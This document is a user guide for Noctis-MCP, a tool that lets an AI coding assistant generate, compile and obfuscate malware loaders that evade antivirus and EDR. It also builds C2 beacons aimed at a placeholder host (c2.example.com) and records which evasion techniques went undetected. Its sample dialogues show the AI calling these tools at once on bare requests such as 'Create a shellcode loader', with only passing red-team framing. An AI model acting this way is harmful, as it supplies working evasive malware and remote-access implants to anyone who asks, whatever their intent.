# User Guide

Complete guide to using Noctis-MCP v2.0 for AI-assisted malware development.

## Table of Contents

1. [What's New in v2.0](#whats-new-in-v20)
2. [Quick Start](#quick-start)
3. [MCP Tools Overview](#mcp-tools-overview)
4. [Core Workflows](#core-workflows)
5. [Advanced Usage](#advanced-usage)
6. [Best Practices](#best-practices)
7. [Troubleshooting](#troubleshooting)

---

## What's New in v2.0

### Simplified Workflow

**Noctis-MCP**: 8 intuitive tools, streamlined AI-driven development

### Key Changes

1. **One-Stop Tool**: `develop()` handles everything - technique selection, code assembly, OPSEC optimization
2. **Agent-Based Architecture**: 4 specialized AI agents work behind the scenes
3. **Cursor IDE Integration**: Native MCP support for seamless AI assistance
4. **Simplified C2**: Just 2 tools (`c2_generate`, `c2_list`) for all C2 frameworks
5. **Better Documentation**: What each tool does, when to use it, with examples

### Migration Guide

```python
# Example workflow
techniques = query_techniques(category='syscalls')
code = generate_code(techniques)
code = obfuscate(code)
code = optimize_opsec(code)
binary = compile(code)

# NEW v2.0 workflow (simple)
develop(
    goal="Create syscall-based loader",
    target="Windows Defender",
    auto_compile=True
)
```

---

## Quick Start

### Prerequisites

1. **Noctis-MCP Server Running**:
   ```bash
   cd C:/path/to/Noctis-MCP
   python server/noctis_server.py --port 8888
   ```

2. **Cursor IDE Configured**:
   - MCP configuration in `~/.cursor/mcp.json`
   - Noctis tools should appear in MCP panel

3. **Ask Your AI Assistant**:
   ```
   "Create a Windows 11 loader that evades Defender using indirect syscalls"
   ```

The AI will use the `develop()` tool automatically!

---

## MCP Tools Overview

### 1. `develop()` - Primary Development Tool

**Purpose**: One-stop tool for creating malware from natural language goals.

**When to Use**:
- Starting a new malware project
- Need automatic technique selection
- Want OPSEC optimization
- Require compilation in one step

**Example**:
```python
develop(
    goal="Create a process injection loader for Windows 11",
    target="Windows Defender",
    auto_compile=True
)
```

**What It Does**:
1. Analyzes your goal
2. Selects compatible techniques (TechniqueSelectionAgent)
3. Assembles working C code (MalwareDevelopmentAgent)
4. Optimizes OPSEC (OpsecOptimizationAgent)
5. Optionally compiles binary
6. Returns ready-to-use code/binary

**AI Assistant Usage**:
```
User: "I need a loader that uses API hashing and syscalls"
Assistant: [calls develop() tool]
```

---

### 2. `browse()` - Explore Techniques

**Purpose**: Discover available techniques by category or MITRE ATT&CK TTP.

**When to Use**:
- Researching available techniques
- Finding techniques for specific MITRE TTPs
- Understanding technique capabilities

**Example**:
```python
# Browse by category
browse(category="syscalls")

# Browse by MITRE TTP
browse(mitre_ttp="T1055")

# Get specific technique details
browse(technique_id="NOCTIS-T124")
```

**Categories Available**:
- `api_hashing` - API obfuscation
- `syscalls` - Direct/indirect syscalls
- `injection` - Process injection methods
- `encryption` - Payload encryption
- `steganography` - Data hiding
- `persistence` - Persistence mechanisms
- `unhooking` - EDR unhooking
- `gpu_evasion` - GPU memory hiding
- `stack_spoof` - Call stack manipulation
- `veh` - Exception handler manipulation

**AI Assistant Usage**:
```
User: "What syscall techniques are available?"
Assistant: [calls browse(category="syscalls")]
```

---

### 3. `compile()` - Build Executables

**Purpose**: Compile C source code into Windows PE executables.

**When to Use**:
- Manual compilation of code
- Specific compiler options needed
- Building from existing source

**Example**:
```python
compile(
    source_code=code,
    architecture="x64",
    optimization="O2",
    subsystem="windows"  # No console window
)
```

**Options**:
- **Architecture**: `x64` (64-bit), `x86` (32-bit)
- **Optimization**: `O0` (debug), `O1` (basic), `O2` (recommended), `O3` (aggressive)
- **Subsystem**: `console` (shows window), `windows` (GUI, no console)

**AI Assistant Usage**:
```
User: "Compile this code with maximum optimization"
Assistant: [calls compile(source_code=..., optimization="O3")]
```

---

### 4. `learn()` - Provide Feedback

**Purpose**: Train the AI system by reporting successes/failures.

**When to Use**:
- Binary successfully evaded AV
- Binary was detected by AV
- Want to improve future results

**Example**:
```python
# Success
learn(
    technique_ids=["NOCTIS-T124", "NOCTIS-T118"],
    feedback_type="success",
    target="Windows Defender",
    notes="Evaded detection on Windows 11 build 22631"
)

# Detection
learn(
    technique_ids=["NOCTIS-T001"],
    feedback_type="detection",
    target="CrowdStrike",
    notes="Detected within 30 seconds"
)
```

**What It Does**:
- Updates technique success rates
- Improves future technique selection
- Builds AV/EDR detection database
- Helps community learn

**AI Assistant Usage**:
```
User: "The loader was detected by Defender"
Assistant: [calls learn(feedback_type="detection", target="Windows Defender")]
```

---

### 5. `files()` - Manage Workspace

**Purpose**: List, read, or delete files in the workspace.

**When to Use**:
- View generated code
- Check compiled binaries
- Clean up workspace

**Example**:
```python
# List all files
files(operation="list")

# Read a file
files(operation="read", file_path="output/loader.c")

# Delete a file
files(operation="delete", file_path="output/test.exe")
```

**Operations**:
- `list` - Show all workspace files
- `read` - Read file contents
- `delete` - Remove file

**AI Assistant Usage**:
```
User: "Show me the generated code"
Assistant: [calls files(operation="read", file_path="output/loader.c")]
```

---

### 6. `help()` - Get Guidance

**Purpose**: Get contextual help and workflow suggestions.

**When to Use**:
- New to Noctis-MCP
- Unsure which tool to use
- Need workflow examples

**Example**:
```python
# General help
help()

# Specific topic
help(topic="syscalls")
help(topic="c2_integration")
```

**Topics Available**:
- `workflow` - Common workflows
- `syscalls` - Syscall techniques
- `injection` - Process injection
- `obfuscation` - Code obfuscation
- `c2_integration` - C2 setup
- `opsec` - OPSEC best practices

**AI Assistant Usage**:
```
User: "How do I create a C2 beacon?"
Assistant: [calls help(topic="c2_integration")]
```

---

### 7. `c2_generate()` - Generate C2 Beacons

**Purpose**: Create C2 framework beacons (Sliver, Havoc, Mythic).

**When to Use**:
- Need a C2 beacon/agent
- Integrating with C2 frameworks
- Deploying persistent access

**Example**:
```python
c2_generate(
    framework="sliver",
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124", "NOCTIS-T118"],
    obfuscate=True
)
```

**Frameworks Supported**:
- `sliver` - Sliver C2
- `havoc` - Havoc C2
- `mythic` - Mythic C2

**Protocols**:
- `http` / `https`
- `dns`
- `tcp`
- `mtls`

**AI Assistant Usage**:
```
User: "Create a Sliver beacon with HTTPS"
Assistant: [calls c2_generate(framework="sliver", protocol="https")]
```

**Note**: Requires Kali Linux or WSL with C2 framework installed.

---

### 8. `c2_list()` - List C2 Frameworks

**Purpose**: Show available C2 frameworks and their status.

**When to Use**:
- Check what C2 frameworks are available
- Verify C2 framework installation
- Get C2 configuration details

**Example**:
```python
c2_list()
```

**Output**:
```json
{
  "frameworks": [
    {
      "name": "sliver",
      "installed": true,
      "version": "1.5.42",
      "listeners": ["https://0.0.0.0:443"]
    },
    {
      "name": "havoc",
      "installed": false
    }
  ]
}
```

**AI Assistant Usage**:
```
User: "What C2 frameworks can I use?"
Assistant: [calls c2_list()]
```

---

## Core Workflows

### Workflow 1: Simple Loader (Beginner)

**Goal**: Create a basic shellcode loader

**Steps**:
```python
# 1. Use develop() for everything
result = develop(
    goal="Create a shellcode loader using indirect syscalls",
    target="Windows Defender",
    architecture="x64",
    auto_compile=True
)

# 2. Done! Binary ready at result['binary_path']
print(f"Loader: {result['binary_path']}")
print(f"OPSEC Score: {result['opsec_score']}/10")
```

**AI Assistant**:
```
User: "Create a shellcode loader"
Assistant: [automatically calls develop()]
```

---

### Workflow 2: C2 Beacon (Intermediate)

**Goal**: Generate obfuscated Sliver beacon

**Steps**:
```python
# 1. Generate beacon
result = c2_generate(
    framework="sliver",
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],
    obfuscate=True
)

# 2. Check OPSEC
if result['opsec_score'] >= 8:
    print(f"Beacon ready: {result['beacon_path']}")
else:
    print("OPSEC too low, adding more techniques...")
```

**AI Assistant**:
```
User: "Create a Sliver HTTPS beacon with good OPSEC"
Assistant: [calls c2_generate() with appropriate techniques]
```

---

### Workflow 3: MITRE ATT&CK Testing (Advanced)

**Goal**: Test blue team detection for T1055 (Process Injection)

**Steps**:
```python
# 1. Find T1055 techniques
result = browse(mitre_ttp="T1055")
techniques = [t['technique_id'] for t in result['techniques']]

print(f"Found {len(techniques)} techniques for T1055:")
for t in result['techniques']:
    print(f"  - {t['technique_id']}: {t['name']}")

# 2. Generate malware using these techniques
result = develop(
    goal="Process injection loader for testing T1055 detection",
    techniques=techniques,  # Force specific techniques
    target="CrowdStrike",
    auto_compile=True
)

# 3. Report includes MITRE coverage
print(f"MITRE TTP: T1055")
print(f"Techniques: {result['techniques_applied']}")
print(f"Binary: {result['binary_path']}")
```

**AI Assistant**:
```
User: "Create malware to test our T1055 detection rules"
Assistant: [calls browse(mitre_ttp="T1055"), then develop()]
```

---

### Workflow 4: Custom Technique Selection (Expert)

**Goal**: Manually select specific techniques

**Steps**:
```python
# 1. Browse available techniques
syscalls = browse(category="syscalls")
encryption = browse(category="encryption")
evasion = browse(category="gpu_evasion")

# 2. Select specific techniques
selected = [
    "NOCTIS-T124",  # Indirect syscalls
    "NOCTIS-T118",  # AES encryption
    "NOCTIS-T201",  # GPU memory hiding
    "NOCTIS-T116"   # Unhooking
]

# 3. Develop with specific techniques
result = develop(
    goal="Stealth loader for Windows 11 + EDR",
    techniques=selected,  # Force these techniques
    target="CrowdStrike",
    architecture="x64",
    complexity="high",
    auto_compile=True
)

# 4. Provide feedback
learn(
    technique_ids=selected,
    feedback_type="success",  # or "detection"
    target="CrowdStrike",
    notes="Evaded detection for 72 hours"
)
```

**AI Assistant**:
```
User: "Create a loader using NOCTIS-T124, T118, and T201"
Assistant: [calls develop(techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"])]
```

---

## Advanced Usage

### Agent-Based Architecture (Under the Hood)

While you use simple tools like `develop()`, v2.0 uses **4 specialized agents** behind the scenes:

1. **TechniqueSelectionAgent**: Chooses best techniques for your goal
2. **MalwareDevelopmentAgent**: Assembles compatible code
3. **OpsecOptimizationAgent**: Optimizes for stealth (OPSEC scoring 0-10)
4. **LearningAgent**: Learns from feedback to improve

**You don't interact with agents directly** - just use `develop()` and the agents work automatically!

### OPSEC Scoring

Every output includes an OPSEC score (0-10):

- **9-10**: Excellent - Hard to detect
- **7-8**: Good - Minor improvements possible
- **5-6**: Moderate - Several improvements needed
- **3-4**: Poor - Easily detected
- **0-2**: Critical - Immediate detection likely

**Factors**:
- String analysis (API names, debug strings)
- Import table (exposed APIs)
- Entropy (encrypted payloads)
- Known signatures
- Memory patterns

**Improving OPSEC**:
```python
# Low OPSEC result
result = develop(goal="Simple loader")
print(f"OPSEC: {result['opsec_score']}/10")  # Output: 4/10

# Add more techniques for better OPSEC
result = develop(
    goal="Simple loader",
    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],  # More evasion
    complexity="high"
)
print(f"OPSEC: {result['opsec_score']}/10")  # Output: 9/10
```

### Technique Compatibility

Not all techniques work together. Noctis automatically ensures compatibility:

**Compatible**:
- API Hashing + Syscalls ✅
- Encryption + Injection ✅
- GPU Evasion + Unhooking ✅

**Incompatible**:
- Direct Syscalls + Indirect Syscalls ❌ (conflicting)
- Multiple injection methods ❌ (redundant)

The `develop()` tool handles this automatically, but if you force incompatible techniques, you'll get an error.

### Batch Generation

Generate multiple variants for testing:

```python
targets = ["Windows Defender", "CrowdStrike", "SentinelOne"]

for target in targets:
    result = develop(
        goal="Loader for AV testing",
        target=target,
        auto_compile=True
    )

    print(f"{target}: {result['binary_path']} (OPSEC: {result['opsec_score']}/10)")
```

---

## Best Practices

### 1. Always Use `develop()` First

```python
# Good - Simple and effective
develop(goal="Create a loader", auto_compile=True)

# Avoid - Unnecessary complexity
techniques = browse(category="syscalls")
code = develop(goal="...", techniques=techniques)
compile(code)
```

Let the AI agents choose the best techniques!

### 2. Check OPSEC Scores

```python
result = develop(goal="Loader")

if result['opsec_score'] < 7:
    print("Warning: Low OPSEC - add more techniques")
```

### 3. Provide Feedback

```python
# Help the system learn
learn(
    technique_ids=result['techniques_applied'],
    feedback_type="success",
    target="Windows Defender"
)
```

### 4. Test in Isolated Environment

```bash
# Never test on production!
# Use isolated VM or sandbox
```

### 5. Use Appropriate Targets

```python
# Specify your actual target
develop(goal="Loader", target="CrowdStrike")  # Not generic "Windows Defender"
```

### 6. Leverage MITRE ATT&CK

```python
# Align with client requirements
browse(mitre_ttp="T1055")  # Client wants to test T1055 detection
```

---

## Troubleshooting

### Issue: Tools Not Showing in Cursor

**Fix**:
1. Check `~/.cursor/mcp.json` configuration
2. Restart Cursor IDE
3. Verify server running: `python server/noctis_server.py --port 8888`

### Issue: Low OPSEC Score

**Fix**:
```python
# Add more evasion techniques
result = develop(
    goal="Loader",
    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],
    complexity="high"
)
```

### Issue: Compilation Fails

**Fix**:
1. Check MinGW-w64 installed (Linux) or MSVC (Windows)
2. Verify source code syntax
3. Check logs in `logs/compiler.log`

### Issue: C2 Beacon Won't Connect

**Fix**:
1. Verify listener running: `c2_list()`
2. Check firewall rules
3. Test connectivity: `telnet c2.example.com 443`
4. Verify beacon configuration

### Issue: Technique Incompatibility Error

**Fix**:
Let `develop()` choose techniques automatically instead of forcing specific ones:

```python
# Instead of this (may conflict)
develop(techniques=["NOCTIS-T124", "NOCTIS-T126"])  # Both syscall methods

# Do this (automatic selection)
develop(goal="Syscall-based loader")
```

---

## Getting Help

### In Cursor IDE

```
User: "How do I create a loader?"
Assistant: [calls help() or develop() automatically]
```

### Documentation

- [MCP_TOOLS_REFERENCE.md](MCP_TOOLS_REFERENCE.md) - Detailed tool reference
- [ARCHITECTURE.md](ARCHITECTURE.md) - Technical architecture
- [C2_INTEGRATION.md](C2_INTEGRATION.md) - C2 framework setup
- [API_REFERENCE.md](API_REFERENCE.md) - REST API endpoints

### Community

- GitHub Issues: Report bugs
- Discussions: Ask questions

---

**Last Updated**: October 4, 2025
**Version**: 2.0.0
